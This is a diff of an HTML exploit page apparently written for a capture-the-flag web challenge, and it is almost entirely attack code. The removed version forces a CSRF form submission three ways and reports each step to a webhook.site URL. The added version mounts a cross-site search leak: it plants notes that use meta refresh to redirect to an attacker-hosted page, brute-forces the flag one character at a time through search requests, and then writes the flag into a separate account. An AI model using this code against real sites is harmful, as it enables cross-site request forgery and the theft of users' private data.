@@ -1,80 +1,167 @@
-<!DOCTYPE html>
-<html>
-<body>
+<!doctype html>
+<meta charset="utf-8">
+<title>loading</title>
+<pre id="log">loading</pre>
 <script>
-var WEBHOOK = 'https://webhook.site/0238ce48-0773-47a3-983d-ccb0b5dc3edc';
+const TARGET = "https://challctf.find-it.id:8023";
+const ATTACKER = "https://2byte36.github.io/test";
+const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+const LEAK_USER = "finditleakgh20260503";
+const LEAK_PASS = "finditleakgh20260503_pass";
 
-function ping(label, extra) {
-  try {
-    var img = new Image();
-    var q = '?step=' + encodeURIComponent(label);
-    if (extra) q += '&info=' + encodeURIComponent(extra);
-    img.src = WEBHOOK + q + '&t=' + Date.now();
-  } catch (e) {}
+let prefix = "FINDIT{";
+let round = 0;
+let currentHit = null;
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+const logEl = document.getElementById("log");
+
+function log(msg) {
+  logEl.textContent += "\n" + msg;
 }
 
-ping('loaded', location.href);
+function htmlEscape(s) {
+  return s
+    .replaceAll("&", "&amp;")
+    .replaceAll("<", "&lt;")
+    .replaceAll(">", "&gt;")
+    .replaceAll('"', "&quot;");
+}
 
-var params = new URLSearchParams(window.location.search);
-var action = params.get('action');
-var csrf = params.get('csrf');
-
-ping('parsed', 'action=' + action + ' csrf_len=' + (csrf ? csrf.length : 0));
-
-if (action && csrf) {
-  // Technique 1: classic auto-submit form (top-level navigation)
-  try {
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = action;
-    var input = document.createElement('input');
-    input.type = 'hidden';
-    input.name = 'csrf_token';
-    input.value = csrf;
-    form.appendChild(input);
-    document.body.appendChild(form);
-    ping('about_to_submit_form');
-    form.submit();
-  } catch (e) {
-    ping('form_submit_err', String(e));
+function popupPost(name, path, fields) {
+  const w = open("", name);
+  if (!w) {
+    return null;
   }
 
-  // Technique 2: fetch with no-cors (in case form submit is blocked)
-  setTimeout(function () {
-    try {
-      fetch(action, {
-        method: 'POST',
-        mode: 'no-cors',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'csrf_token=' + encodeURIComponent(csrf)
-      }).then(function () {
-        ping('fetch_ok');
-      }).catch(function (e) {
-        ping('fetch_err', String(e));
-      });
-    } catch (e) {
-      ping('fetch_throw', String(e));
-    }
-  }, 500);
+  const inputs = Object.entries(fields).map(([key, value]) => {
+    return `<textarea name="${htmlEscape(key)}">${htmlEscape(value)}</textarea>`;
+  }).join("");
 
-  // Technique 3: XHR
-  setTimeout(function () {
-    try {
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', action, true);
-      xhr.withCredentials = true;
-      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-      xhr.onload = function () { ping('xhr_done', String(xhr.status)); };
-      xhr.onerror = function () { ping('xhr_err'); };
-      xhr.send('csrf_token=' + encodeURIComponent(csrf));
-    } catch (e) {
-      ping('xhr_throw', String(e));
-    }
-  }, 1000);
-} else {
-  ping('missing_params');
+  w.document.write(
+    `<!doctype html><meta charset="utf-8">` +
+    `<form id="f" method="POST" action="${TARGET}${path}">${inputs}</form>` +
+    `<script>document.getElementById("f").submit()<\/script>`
+  );
+  return w;
 }
+
+function closeQuietly(w) {
+  try {
+    if (w) {
+      w.close();
+    }
+  } catch (_) {}
+}
+
+function receiveHit(data) {
+  if (!data || String(data.round) !== String(round) || currentHit) {
+    return;
+  }
+  currentHit = data;
+  log("hit " + data.q);
+}
+
+try {
+  const channel = new BroadcastChannel("findit-hit-channel");
+  channel.onmessage = (event) => receiveHit(event.data);
+} catch (_) {}
+
+window.addEventListener("storage", (event) => {
+  if (event.key === "findit-hit" && event.newValue) {
+    try {
+      receiveHit(JSON.parse(event.newValue));
+    } catch (_) {}
+  }
+});
+
+async function waitForHit() {
+  for (let i = 0; i < 50; i++) {
+    if (currentHit) {
+      return currentHit;
+    }
+    try {
+      const data = JSON.parse(localStorage.getItem("findit-hit") || "null");
+      receiveHit(data);
+    } catch (_) {}
+    await sleep(100);
+  }
+  return null;
+}
+
+async function runRound() {
+  round += 1;
+  currentHit = null;
+  localStorage.removeItem("findit-hit");
+  log("round " + round + " prefix=" + prefix);
+
+  const candidates = [...ALPHABET].map((ch, idx) => ({ ch, idx, q: prefix + ch }));
+  const opened = [];
+
+  opened.push(popupPost("z_" + round, "/create-note", {
+    content: "Z " + candidates.map((c) => c.q).join(" ")
+  }));
+  await sleep(100);
+
+  for (const c of candidates) {
+    const hit = `${ATTACKER}/hit.html?round=${round}&ch=${encodeURIComponent(c.ch)}&q=${encodeURIComponent(c.q)}`;
+    const content =
+      `G ${c.q} <!--managed-->` +
+      `<meta name="referrer" content="unsafe-url">` +
+      `<meta http-equiv="refresh" content="0;url=${hit}">`;
+    opened.push(popupPost("g_" + round + "_" + c.idx, "/create-note", { content }));
+    await sleep(5);
+  }
+
+  await sleep(450);
+
+  for (const c of candidates) {
+    opened.push(open(`${TARGET}/search-notes?query=view:${encodeURIComponent(c.q)}`, "s_" + round + "_" + c.idx));
+    await sleep(5);
+  }
+
+  const hit = await waitForHit();
+  opened.forEach(closeQuietly);
+
+  if (!hit) {
+    log("no hit after " + prefix);
+    return;
+  }
+
+  prefix += hit.ch;
+  if (hit.ch === "}") {
+    await storeFlag(prefix);
+    return;
+  }
+
+  await sleep(100);
+  runRound();
+}
+
+async function storeFlag(flag) {
+  log("flag=" + flag);
+  popupPost("final_register", "/register", {
+    username: LEAK_USER,
+    password: LEAK_PASS
+  });
+  await sleep(800);
+
+  popupPost("final_login", "/login", {
+    username: LEAK_USER,
+    password: LEAK_PASS
+  });
+  await sleep(1200);
+
+  popupPost("final_note_1", "/create-note", {
+    content: "LEAK " + flag
+  });
+  await sleep(800);
+
+  popupPost("final_note_2", "/create-note", {
+    content: "LEAK " + flag
+  });
+  log("stored in " + LEAK_USER);
+}
+
+setTimeout(runRound, 500);
 </script>
-</body>
-</html>
